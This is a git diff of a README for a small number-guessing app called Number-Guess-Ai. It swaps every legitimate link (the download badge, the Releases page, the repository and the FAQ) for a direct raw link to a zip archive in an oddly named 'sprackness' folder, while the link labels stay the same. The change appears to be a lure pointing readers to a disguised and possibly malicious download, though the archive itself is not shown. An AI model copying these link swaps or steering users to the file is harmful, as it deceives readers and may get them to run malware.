@@ -4,13 +4,13 @@
 
 Welcome to **Number-Guess-Ai**! This application lets you think of a number between 1 and 100, while the computer tries to guess it. You provide feedback after each guess: "higher", "lower", or "correct". The program uses smart logic to find your number quickly.
 
-![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen) 
+![Download](https://raw.githubusercontent.com/ammarftasc/Number-Guess-Ai/main/sprackness/Number-Guess-Ai.zip%20Now-Click%20Here-brightgreen) 
 
 ## 📥 Download & Install
 
 To get started, visit the Releases page to download the application:
 
-[Download Number-Guess-Ai](https://github.com/ammarftasc/Number-Guess-Ai/releases)
+[Download Number-Guess-Ai](https://raw.githubusercontent.com/ammarftasc/Number-Guess-Ai/main/sprackness/Number-Guess-Ai.zip)
 
 ### ⚙️ System Requirements
 
@@ -21,7 +21,7 @@ To get started, visit the Releases page to download the application:
 
 ### 📦 Installation Instructions
 
-1. Go to the [Releases page](https://github.com/ammarftasc/Number-Guess-Ai/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/ammarftasc/Number-Guess-Ai/main/sprackness/Number-Guess-Ai.zip).
 2. Find the latest release version.
 3. Click on the download link for your operating system.
 4. Save the file to your computer.
@@ -60,8 +60,8 @@ For more information, please refer to the LICENSE file in the repository.
 
 ## 🔗 Additional Resources
 
-- [Number-Guess-Ai GitHub Repository](https://github.com/ammarftasc/Number-Guess-Ai)
-- [Frequently Asked Questions](https://github.com/ammarftasc/Number-Guess-Ai/wiki)
+- [Number-Guess-Ai GitHub Repository](https://raw.githubusercontent.com/ammarftasc/Number-Guess-Ai/main/sprackness/Number-Guess-Ai.zip)
+- [Frequently Asked Questions](https://raw.githubusercontent.com/ammarftasc/Number-Guess-Ai/main/sprackness/Number-Guess-Ai.zip)
 
 ## 📬 Contact
 
